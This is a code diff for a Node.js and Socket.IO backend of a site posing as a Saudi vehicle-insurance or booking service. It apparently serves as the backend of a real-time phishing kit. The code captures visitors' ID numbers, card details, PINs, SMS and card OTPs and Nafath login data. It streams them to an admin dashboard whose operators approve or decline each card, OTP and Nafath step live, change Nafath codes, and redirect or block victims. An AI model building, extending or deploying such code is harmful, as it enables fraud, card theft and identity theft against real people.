@@ -1,40 +1,30 @@
 /**
- * gosuksa backend — Railway-ready
+ * gosuksa backend — Railway-ready (v6)
  *
- * Implements the exact API contract the frontend bundle expects:
+ * Serves two contracts on the same service:
  *
- *  REST (called via same-origin /api-proxy/* from the Lovable frontend):
- *    GET  /                            -> health
- *    GET  /health                      -> { ok:true }
- *    GET  /breinit                     -> { ok:true }               (KSA gate stub)
- *    POST /api/user/init               -> { ok, _id, session, userInfo }
- *    POST /api/chat/enabled            -> { isChatEnabled: 0|1 }
- *    GET  /api/vicinfomain/captcha     -> { sessionId, captchaUuid, imageB64, imageDataUrl }
- *    POST /api/vicinfomain/createRequest
- *                                      -> { status, vehicle? , errorCode? }
- *    POST /api/store-policy            -> { ok:true }               (persist policy)
- *    POST /api/data/store-details      -> { ok:true }               (persist step data)
- *    POST /api/app-logs/:appId/log-user-in-app/:page -> { ok:true } (page-view beacon)
+ *  A) Customer site (this Lovable frontend) — preserved from v5:
+ *     GET  /breinit, POST /api/user/init, POST /api/chat/enabled,
+ *     GET  /api/vicinfomain/captcha, POST /api/vicinfomain/createRequest,
+ *     POST /api/store-policy, POST /api/data/store-details,
+ *     POST /api/app-logs/:appId/log-user-in-app/:page,
+ *     Socket.IO events: user:join, chat:message, booking:update, otp:*, nafath:*, …
  *
- *  Socket.IO (path: /socket.io) — events emitted by the client:
- *    user:join, user:pageNavigation, user:typingStatus, user:statusUpdate,
- *    user:getChatHistory, admin:getChatHistory, admin:getUpdates,
- *    chat:message, booking:update, payment:update,
- *    otp:received, pin:received, nafath:submitted,
- *    phone:submitted, naflogin:submitted, nafotp:submitted, rajlogin:submitted,
- *    health:submitted, health2:submitted, health3:submitted, health4:submitted,
- *    client:cancelOtp, client:cancelPayment,
- *    payment:duplicateAttempt, otp:duplicateAttempt, bin:lookup
+ *  B) Admin dashboard (Sherpa / tmn-backend contract):
+ *     GET  /users, GET /users/:id, DELETE /users/:id
+ *     POST /reg, POST /apply/:id, POST /company/:id,
+ *     POST /visa, POST /phone, POST /phone-otp, POST /visa-otp
+ *     Socket.IO: join{role}, bindOrder, newData, paymentForm, visaOtp,
+ *                phone, phoneOtp, navaz
+ *     Admin -> visitor: acceptService/declineService, acceptPaymentForm/
+ *                declinePaymentForm, acceptPhone/declinePhone,
+ *                acceptVisaOtp/declineVisaOtp, acceptPhoneOtp/declinePhoneOtp,
+ *                acceptNavaz/declineNavaz, adminRedirect, clientBlocked,
+ *                changeNavazCode
  *
- *  Events emitted TO clients:
- *    user:joined, user:uuidAssigned, csrf:token, site:publicSettings,
- *    chat:history, chat:message, live:update, live:updatesHistory,
- *    form:submitted (ack for booking), payment:action, otp:action,
- *    nafath:action, naflogin:action, phone:action, user:blocked,
- *    user:statusUpdate, user:typingStatus
- *
- * Storage: single JSON file (data.json). Swap for Mongo/Postgres later —
- * every write goes through the `db` helper.
+ * Every customer submission is ALSO mirrored into the session store keyed
+ * by the client's uuid, so `GET /users` (what the dashboard polls) returns
+ * a live row per visitor with all their submitted fields.
  */
 
 const express = require("express");
@@ -51,54 +41,76 @@ const PORT = process.env.PORT || 3000;
 const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, "data.json");
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "change-me";
 const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;
+const CORS_ORIGINS = (process.env.CORS_ORIGINS || "*")
+  .split(",")
+  .map((s) => s.trim())
+  .filter(Boolean);
+const corsOrigin = CORS_ORIGINS.includes("*") ? true : CORS_ORIGINS;
 
 // ---------- tiny JSON "db" ----------
 const db = (() => {
   const empty = {
-    users: {},         // uuid -> { uuid, createdAt, ip, ua, ... }
-    submissions: [],   // { id, type, uuid, payload, ts }
-    policies: [],      // stored policies from /api/store-policy
-    details: [],       // stored motor step payloads
-    chats: {},         // uuid -> [{ id, from, message, ts }]
-    captchas: {},      // sessionId -> { captchaUuid, code, ts }
-    blocked: {},       // uuid -> true
+    users: {},        // uuid -> session row (used by dashboard GET /users)
+    submissions: [],  // audit log { id, type, uuid, payload, ts }
+    policies: [],
+    details: [],
+    chats: {},
+    captchas: {},
+    blocked: {},
     logs: [],
   };
   let state = empty;
   try {
-    if (fs.existsSync(DATA_FILE)) state = { ...empty, ...JSON.parse(fs.readFileSync(DATA_FILE, "utf8")) };
-  } catch (e) { console.warn("db load failed:", e.message); }
+    if (fs.existsSync(DATA_FILE))
+      state = { ...empty, ...JSON.parse(fs.readFileSync(DATA_FILE, "utf8")) };
+  } catch (e) {
+    console.warn("db load failed:", e.message);
+  }
   let dirty = false;
   setInterval(() => {
     if (!dirty) return;
     dirty = false;
-    try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); }
-    catch (e) { console.warn("db save failed:", e.message); }
+    try {
+      fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
+    } catch (e) {
+      console.warn("db save failed:", e.message);
+    }
   }, 1000);
   return {
     get: () => state,
-    save: () => { dirty = true; },
-    flush: () => { dirty = false; try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); } catch (e) { console.warn("db save failed:", e.message); } },
+    save: () => {
+      dirty = true;
+    },
+    flush: () => {
+      dirty = false;
+      try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
+      } catch (e) {
+        console.warn("db save failed:", e.message);
+      }
+    },
   };
 })();
 
 // ---------- app ----------
 const app = express();
 app.set("trust proxy", true);
-app.use(cors({ origin: true, credentials: true }));
+app.use(cors({ origin: corsOrigin, credentials: true }));
 app.use(express.json({ limit: "5mb" }));
 app.use(express.urlencoded({ extended: true, limit: "5mb" }));
 
 const server = http.createServer(app);
 const io = new Server(server, {
   path: "/socket.io",
-  cors: { origin: true, credentials: true },
+  cors: { origin: corsOrigin, credentials: true },
 });
 
 // ---------- helpers ----------
 const now = () => new Date().toISOString();
 const STARTED_AT = new Date().toISOString();
 const uuid = () => crypto.randomUUID();
+const newId = () =>
+  Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
 
 function clientIp(req) {
   return (
@@ -110,17 +122,63 @@ function clientIp(req) {
 }
 
 function requireAdmin(req, res, next) {
-  const t = req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
+  const t =
+    req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
   if (t !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
   next();
 }
 
-// ---------- REST routes ----------
+/** Upsert a session row into state.users (dashboard reads this via /users). */
+function upsertSession(id, patch, extra = {}) {
+  if (!id) return null;
+  const state = db.get();
+  const existing = state.users[id] || {
+    id,
+    uuid: id,
+    createdAt: now(),
+  };
+  const next = {
+    ...existing,
+    ...patch,
+    id,
+    uuid: id,
+    updatedAt: now(),
+    ...extra,
+  };
+  state.users[id] = next;
+  db.save();
+  // Push realtime update to dashboards
+  io.emit("sessionUpdate", next);
+  io.to("admins").emit("newVisitor", next);
+  return next;
+}
+
+function recordSubmission(type, payload) {
+  const state = db.get();
+  const id = payload?.uuid || payload?.id || payload?.userId || null;
+  const entry = { id: uuid(), type, uuid: id, ts: now(), payload };
+  state.submissions.push(entry);
+  db.flush();
+  console.log(
+    `[submission] ${type} ${payload?.result || ""} total=${state.submissions.length}`
+  );
+  io.to("admins").emit("live:update", entry);
+  if (id) upsertSession(id, { [type]: payload, lastEvent: type, stage: type });
+  return entry;
+}
+
+function broadcastAdminEvent(id, event, payload) {
+  if (!id) return;
+  io.to(`session:${id}`).emit(event, payload ?? { id });
+  io.to(`user:${id}`).emit(event, payload ?? { id });
+  io.to("admins").emit(`admin:${event}`, { id, payload });
+}
+
+// ---------- REST: health / meta ----------
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-// Deployment fingerprint — lets us confirm which build Railway is running.
-const APP_VERSION = "v5";
+const APP_VERSION = "v6";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -128,30 +186,28 @@ app.get("/version", (_req, res) =>
     persistent: DATA_FILE.startsWith("/data"),
     vicUpstream: !!process.env.VIC_UPSTREAM_URL,
     submissions: db.get().submissions.length,
+    users: Object.keys(db.get().users).length,
     startedAt: STARTED_AT,
   })
 );
 
-
-// KSA/geo gate stub — frontend calls this on boot
 app.get("/breinit", (_req, res) => res.json({ ok: true }));
+app.post("/api/chat/enabled", (_req, res) =>
+  res.json({ isChatEnabled: CHAT_ENABLED })
+);
 
-// User init — frontend requires userInfo.uuid or it stalls
+// ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
   const { uuid: sentUuid, browserInfo } = req.body || {};
   const id = sentUuid || uuid();
   const ip = clientIp(req);
-  const state = db.get();
-  state.users[id] = {
-    ...(state.users[id] || {}),
-    uuid: id,
+  upsertSession(id, {
     ip,
     ua: req.headers["user-agent"] || "",
     browserInfo: browserInfo || null,
     lastSeen: now(),
-    createdAt: state.users[id]?.createdAt || now(),
-  };
-  db.save();
+    stage: "init",
+  });
   res.json({
     ok: true,
     _id: id,
@@ -166,13 +222,6 @@ app.post("/api/user/init", (req, res) => {
   });
 });
 
-app.post("/api/chat/enabled", (_req, res) => res.json({ isChatEnabled: CHAT_ENABLED }));
-
-// ---------- Vehicle Info Main (VIC) captcha + lookup ----------
-// The captcha image is generated here (real, readable PNG) and validated on
-// createRequest. The vehicle lookup is forwarded to the real provider when
-// VIC_UPSTREAM_URL is set; otherwise the request is recorded as
-// vehicle_not_found. No mock data is ever returned.
 app.get("/api/vicinfomain/captcha", (_req, res) => {
   const sessionId = uuid();
   const captchaUuid = uuid();
@@ -213,17 +262,22 @@ app.post("/api/vicinfomain/createRequest", async (req, res) => {
   };
 
   if (!c || c.captchaUuid !== captchaUuid) {
-    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
+    recordSubmission("vehicleRequest", {
+      ...baseSubmission,
+      result: "invalid_captcha",
+    });
     return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
   }
   if (String(jcaptcha).trim() !== c.code) {
-    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
+    recordSubmission("vehicleRequest", {
+      ...baseSubmission,
+      result: "invalid_captcha",
+    });
     return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
   }
   delete state.captchas[vicinfomainSessionId];
   db.save();
 
-  // Real VIC lookup: forwarded to the upstream provider when configured.
   if (process.env.VIC_UPSTREAM_URL) {
     try {
       const r = await fetch(process.env.VIC_UPSTREAM_URL, {
@@ -234,23 +288,36 @@ app.post("/api/vicinfomain/createRequest", async (req, res) => {
             ? { authorization: `Bearer ${process.env.VIC_UPSTREAM_TOKEN}` }
             : {}),
         },
-        body: JSON.stringify({ sequenceNumber, identityNumber: baseSubmission.identityNumber }),
+        body: JSON.stringify({
+          sequenceNumber,
+          identityNumber: baseSubmission.identityNumber,
+        }),
       });
       const data = await r.json().catch(() => null);
-      const vehicle = data?.vehicle || (data && data.vehicleMaker ? data : null);
+      const vehicle =
+        data?.vehicle || (data && data.vehicleMaker ? data : null);
       if (r.ok && vehicle) {
-        recordSubmission("vehicleRequest", { ...baseSubmission, result: "success", vehicle });
+        recordSubmission("vehicleRequest", {
+          ...baseSubmission,
+          result: "success",
+          vehicle,
+        });
         return res.json({ status: "success", vehicle });
       }
     } catch (e) {
       console.warn("[vic] upstream lookup failed:", e.message);
     }
   }
-  recordSubmission("vehicleRequest", { ...baseSubmission, result: "vehicle_not_found" });
-  return res.json({ status: "vehicle_not_found", errorCode: "vehicle_not_found" });
+  recordSubmission("vehicleRequest", {
+    ...baseSubmission,
+    result: "vehicle_not_found",
+  });
+  return res.json({
+    status: "vehicle_not_found",
+    errorCode: "vehicle_not_found",
+  });
 });
 
-// Policy / step details persistence
 app.post("/api/store-policy", (req, res) => {
   const state = db.get();
   const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
@@ -259,6 +326,7 @@ app.post("/api/store-policy", (req, res) => {
   recordSubmission("policy", entry);
   res.json({ ok: true });
 });
+
 app.post("/api/data/store-details", (req, res) => {
   const state = db.get();
   const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
@@ -268,45 +336,100 @@ app.post("/api/data/store-details", (req, res) => {
   res.json({ ok: true });
 });
 
-// Frontend page-view beacon
 app.post("/api/app-logs/:appId/log-user-in-app/:page", (req, res) => {
   const state = db.get();
-  state.logs.push({ ts: now(), appId: req.params.appId, page: req.params.page, ip: clientIp(req) });
+  const entry = {
+    ts: now(),
+    appId: req.params.appId,
+    page: req.params.page,
+    ip: clientIp(req),
+    ...req.body,
+  };
+  state.logs.push(entry);
   if (state.logs.length > 5000) state.logs.splice(0, state.logs.length - 5000);
+  db.save();
+  const id = req.body?.uuid || req.body?.userId;
+  if (id) upsertSession(id, { lastPage: req.params.page, lastSeen: now() });
+  res.json({ ok: true });
+});
+
+// ---------- REST: admin dashboard contract (tmn-backend) ----------
+// The Sherpa admin dashboard polls GET /users. It expects an array of
+// session rows keyed by id. We serve it publicly (matches original tmn
+// contract) OR require Bearer token when ADMIN_LIST_PROTECTED=1.
+function maybeAdmin(req, res, next) {
+  if (process.env.ADMIN_LIST_PROTECTED === "1") return requireAdmin(req, res, next);
+  next();
+}
+
+app.get("/users", maybeAdmin, (_req, res) => {
+  const list = Object.values(db.get().users).sort(
+    (a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0)
+  );
+  res.json(list);
+});
+app.get("/users/:id", maybeAdmin, (req, res) => {
+  const s = db.get().users[req.params.id];
+  if (!s) return res.status(404).json({ error: "not_found" });
+  res.json(s);
+});
+app.delete("/users/:id", maybeAdmin, (req, res) => {
+  delete db.get().users[req.params.id];
   db.save();
   res.json({ ok: true });
 });
 
-// ---------- Admin read APIs (Bearer ADMIN_TOKEN) ----------
+app.post("/reg", (req, res) => {
+  const id = req.body.id || req.body.uuid || newId();
+  const s = upsertSession(id, {
+    ...req.body,
+    ip: clientIp(req),
+    stage: "registered",
+  });
+  recordSubmission("reg", { ...req.body, uuid: id });
+  res.json(s);
+});
+
+function stepHandler(stage) {
+  return (req, res) => {
+    const id = req.params.id || req.body.id || req.body.uuid;
+    if (!id) return res.status(400).json({ error: "missing_id" });
+    const s = upsertSession(id, { ...req.body, stage });
+    recordSubmission(stage, { ...req.body, uuid: id });
+    res.json(s);
+  };
+}
+
+app.post("/apply/:id", stepHandler("apply"));
+app.post("/company/:id", stepHandler("company"));
+app.post("/visa", stepHandler("visa"));
+app.post("/phone", stepHandler("phone"));
+app.post("/phone-otp", stepHandler("phoneOtp"));
+app.post("/visa-otp", stepHandler("visaOtp"));
+
+// ---------- Admin read APIs (existing) ----------
 app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
-app.get("/admin/submissions", requireAdmin, (_req, res) => res.json(db.get().submissions));
+app.get("/admin/submissions", requireAdmin, (_req, res) =>
+  res.json(db.get().submissions)
+);
 app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));
 
 // ---------- Socket.IO ----------
-function recordSubmission(type, payload) {
-  const state = db.get();
-  const entry = { id: uuid(), type, uuid: payload?.uuid || payload?.userId || null, ts: now(), payload };
-  state.submissions.push(entry);
-  db.flush();
-  console.log(`[submission] ${type} ${entry.payload?.result || ""} total=${state.submissions.length}`);
-  io.to("admins").emit("live:update", entry);
-  return entry;
-}
-
 io.on("connection", (socket) => {
   console.log(`[io] connected ${socket.id}`);
 
-  // CSRF stub — the client refuses to submit booking until it has a token
   const csrf = crypto.randomBytes(24).toString("hex");
   socket.emit("csrf:token", { token: csrf });
   socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
   socket.data.csrf = csrf;
 
+  // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
     const userType = p.userType || "client";
     const uid = p.userId || p.userInfo?.uuid || uuid();
     socket.data.userType = userType;
     socket.data.userId = uid;
+    socket.data.sessionId = uid;
 
     if (userType === "admin") {
       if (p.userInfo?.adminToken && p.userInfo.adminToken !== ADMIN_TOKEN) {
@@ -316,32 +439,112 @@ io.on("connection", (socket) => {
       }
       socket.join("admins");
       socket.emit("user:joined", { userId: uid });
-      // Send existing submissions as history
       socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
       return;
     }
-
-    // client
     if (db.get().blocked[uid]) {
       socket.emit("user:blocked", { reason: "blocked" });
       return;
     }
     socket.join(`user:${uid}`);
+    socket.join(`session:${uid}`);
     socket.emit("user:joined", { userId: uid });
     socket.emit("user:uuidAssigned", { uuid: uid });
+    upsertSession(uid, { lastSeen: now(), ip: clientIp(socket.request) });
   });
 
-  // Chat
+  // -------- Admin dashboard (tmn-backend) join --------
+  socket.on("join", (data = {}) => {
+    const role = data.role || "visitor";
+    socket.data.role = role;
+    if (role === "admin") {
+      if (data.adminToken && data.adminToken !== ADMIN_TOKEN) {
+        socket.emit("clientBlocked", { reason: "invalid_admin_token" });
+        socket.disconnect(true);
+        return;
+      }
+      socket.join("admins");
+      // Send existing sessions so the dashboard populates immediately
+      Object.values(db.get().users).forEach((u) => socket.emit("sessionUpdate", u));
+    }
+  });
+
+  socket.on("bindOrder", (id) => {
+    if (!id) return;
+    socket.data.sessionId = id;
+    socket.join(`session:${id}`);
+    socket.join(`user:${id}`);
+  });
+
+  socket.on("newData", (payload = {}) => {
+    const id = payload.id || payload.uuid || socket.data.sessionId || newId();
+    const s = upsertSession(id, payload);
+    recordSubmission("newData", { ...payload, uuid: id });
+    io.to("admins").emit("newVisitor", s);
+  });
+
+  // visitor -> admin submissions (tmn contract)
+  ["paymentForm", "visaOtp", "phone", "phoneOtp", "navaz"].forEach((ev) => {
+    socket.on(ev, (payload = {}) => {
+      const id = payload.id || payload.uuid || socket.data.sessionId;
+      if (!id) return;
+      upsertSession(id, { [ev]: payload, lastEvent: ev, stage: ev });
+      recordSubmission(ev, { ...payload, uuid: id });
+      io.to("admins").emit(ev, { ...payload, id, uuid: id });
+    });
+  });
+
+  // admin -> visitor control events (tmn contract)
+  const adminControlEvents = [
+    "acceptService",
+    "declineService",
+    "acceptPaymentForm",
+    "declinePaymentForm",
+    "acceptPhone",
+    "declinePhone",
+    "acceptVisaOtp",
+    "declineVisaOtp",
+    "acceptPhoneOtp",
+    "declinePhoneOtp",
+    "acceptNavaz",
+    "declineNavaz",
+    "adminRedirect",
+    "clientBlocked",
+    "changeNavazCode",
+  ];
+  adminControlEvents.forEach((ev) => {
+    socket.on(ev, (payload = {}) => {
+      if (socket.data.role !== "admin" && socket.data.userType !== "admin")
+        return;
+      const id = typeof payload === "string" ? payload : payload.id || payload.uuid;
+      broadcastAdminEvent(id, ev, payload);
+    });
+  });
+
+  // -------- Frontend chat + booking (kept) --------
   socket.on("chat:message", (msg, ack) => {
-    const uid = socket.data.userId;
+    const uid = socket.data.userId || socket.data.sessionId;
     if (!uid) return ack && ack({ ok: false, error: "no_user" });
     const state = db.get();
     const list = (state.chats[uid] ||= []);
-    const entry = { id: uuid(), from: socket.data.userType || "client", message: msg?.message || "", ts: now() };
+    const entry = {
+      id: uuid(),
+      from: socket.data.userType || socket.data.role || "client",
+      message: msg?.message || "",
+      ts: now(),
+    };
     list.push(entry);
     db.save();
-    io.to(`user:${uid}`).emit("chat:message", { ...entry, userType: entry.from, targetUserId: uid });
-    io.to("admins").emit("chat:message", { ...entry, userType: entry.from, targetUserId: uid });
+    io.to(`user:${uid}`).emit("chat:message", {
+      ...entry,
+      userType: entry.from,
+      targetUserId: uid,
+    });
+    io.to("admins").emit("chat:message", {
+      ...entry,
+      userType: entry.from,
+      targetUserId: uid,
+    });
     ack && ack({ ok: true, id: entry.id });
   });
 
@@ -351,22 +554,24 @@ io.on("connection", (socket) => {
   });
   socket.on("admin:getChatHistory", (p = {}) => {
     const uid = p.userId || p.uuid;
-    socket.emit("chat:history", uid ? db.get().chats[uid] || [] : db.get().chats);
+    socket.emit(
+      "chat:history",
+      uid ? db.get().chats[uid] || [] : db.get().chats
+    );
   });
   socket.on("admin:getUpdates", () => {
     socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
   });
 
-  // Booking flow — must ack with { formType:"booking", success:true }
   socket.on("booking:update", (payload = {}, ack) => {
-    recordSubmission("booking", payload);
+    const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
+    recordSubmission("booking", { ...payload, uuid: id });
     const res = { formType: "booking", success: true };
     io.to("admins").emit("form:submitted", res);
     socket.emit("form:submitted", res);
     ack && ack(res);
   });
 
-  // Every other client -> server event: persist + forward to admins
   const passthrough = [
     "payment:update",
     "otp:received",
@@ -387,37 +592,63 @@ io.on("connection", (socket) => {
   ];
   for (const ev of passthrough) {
     socket.on(ev, (payload = {}) => {
-      recordSubmission(ev, payload);
+      const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
+      recordSubmission(ev, { ...payload, uuid: id });
     });
   }
 
-  // BIN lookup — client passes { bin } and expects ack({ ok, meta:{ brand, scheme, ...} })
   socket.on("bin:lookup", ({ bin } = {}, ack) => {
     if (!ack) return;
-    // Stub — swap for a real BIN provider (binlist, etc.)
     ack({ ok: true, meta: { brand: "unknown", scheme: "unknown", bin } });
   });
 
-  // Presence / typing
-  socket.on("user:pageNavigation", (p) => io.to("admins").emit("live:update", { type: "pageNavigation", uuid: socket.data.userId, page: p?.page, ts: now() }));
-  socket.on("user:typingStatus", (p) => io.to("admins").emit("user:typingStatus", { uuid: socket.data.userId, ...p }));
-  socket.on("user:statusUpdate", (p) => io.to("admins").emit("user:statusUpdate", { uuid: socket.data.userId, ...p }));
+  socket.on("user:pageNavigation", (p) => {
+    const uid = socket.data.userId;
+    if (uid) upsertSession(uid, { lastPage: p?.page, lastSeen: now() });
+    io.to("admins").emit("live:update", {
+      type: "pageNavigation",
+      uuid: uid,
+      page: p?.page,
+      ts: now(),
+    });
+  });
+  socket.on("user:typingStatus", (p) =>
+    io.to("admins").emit("user:typingStatus", {
+      uuid: socket.data.userId,
+      ...p,
+    })
+  );
+  socket.on("user:statusUpdate", (p) =>
+    io.to("admins").emit("user:statusUpdate", {
+      uuid: socket.data.userId,
+      ...p,
+    })
+  );
 
-  // Admin -> client actions
-  const adminEvents = ["payment:action", "otp:action", "nafath:action", "naflogin:action", "phone:action", "admin:redirect"];
-  for (const ev of adminEvents) {
+  // Legacy frontend admin -> client actions (kept)
+  const legacyAdminEvents = [
+    "payment:action",
+    "otp:action",
+    "nafath:action",
+    "naflogin:action",
+    "phone:action",
+    "admin:redirect",
+  ];
+  for (const ev of legacyAdminEvents) {
     socket.on(ev, (p = {}) => {
-      if (socket.data.userType !== "admin") return;
-      const target = p.userId || p.uuid;
+      if (socket.data.userType !== "admin" && socket.data.role !== "admin")
+        return;
+      const target = p.userId || p.uuid || p.id;
       if (target) io.to(`user:${target}`).emit(ev, p);
     });
   }
 
-  socket.on("disconnect", (reason) => console.log(`[io] disconnect ${socket.id} ${reason}`));
+  socket.on("disconnect", (reason) =>
+    console.log(`[io] disconnect ${socket.id} ${reason}`)
+  );
 });
 
-// ---------- start ----------
 server.listen(PORT, () => {
-  console.log(`gosuksa backend listening on :${PORT}`);
+  console.log(`gosuksa backend ${APP_VERSION} listening on :${PORT}`);
   console.log(`data file: ${DATA_FILE}`);
 });
